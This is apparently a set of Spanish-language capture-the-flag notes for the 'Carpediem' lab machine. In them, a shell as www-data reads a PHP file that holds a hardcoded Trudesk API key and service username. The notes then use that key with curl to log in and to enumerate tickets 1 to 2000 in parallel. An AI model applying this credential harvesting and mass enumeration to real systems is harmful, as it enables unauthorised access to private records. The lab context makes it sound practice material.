
# IDENTIFICAR EL ARCHIVO CON LA API, USUARIO Y SUBDOMINIO.
```shell
www-data@3c371615b7aa:/var/www/html/portal/classes$ cat Trudesk.php
cat Trudesk.php
<?php
class TrudeskConnection{

    private $host = 'trudesk.carpediem.htb';
    private $apikey = 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4';
    private $username = 'svc-portal-tickets';
    private $password = '';
    private $database = '';
}
?>
```

# API DEL TRUDESK
```shell
❯ curl -s -X GET 'http://trudesk.carpediem.htb/api/v1/login' -H 'accesstoken: TU_API_KEY'| jq
{
  "success": true,
  "user": {
    "hasL2Auth": false,
    "deleted": false,
    "_id": "6243c69d1acd1559cdb4019b",
    "username": "svc-portal-tickets",
    "email": "tickets@carpediem.htb",
    "fullname": "Portal Tickets",
    "title": "",
    "role": {
      "_id": "623c8b20855cc5001a8ba13a",
      "name": "User",
      "description": "Default role for users",
      "normalized": "user",
      "isAdmin": false,
      "isAgent": false,
      "id": "623c8b20855cc5001a8ba13a"
    },
    "lastOnline": "2022-03-30T13:50:02.824Z"
  }
}

[ENUMERAR TICKETS]
❯ seq 1 2000 | xargs -P50 -I {} curl -s -X GET 'http://trudesk.carpediem.htb/api/v1/tickets/{}' -H 'accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4'| jq | grep -vE "false|Invalid|{|}"
```
